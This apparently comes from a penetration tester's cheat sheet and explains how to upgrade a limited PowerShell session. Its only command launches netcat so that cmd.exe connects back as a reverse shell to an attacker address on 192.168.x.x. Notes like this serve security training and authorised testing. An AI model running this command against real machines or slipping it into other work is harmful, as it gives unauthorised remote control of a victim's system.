> If we are stuck in PS or if we have issues with the shell we can upgrade it by transferring over netcat from kali and then running:

```
powershell -Command "Start-Process -NoNewWindow -FilePath nc.exe -ArgumentList '192.168.x.x <port> -e cmd.exe'"
```
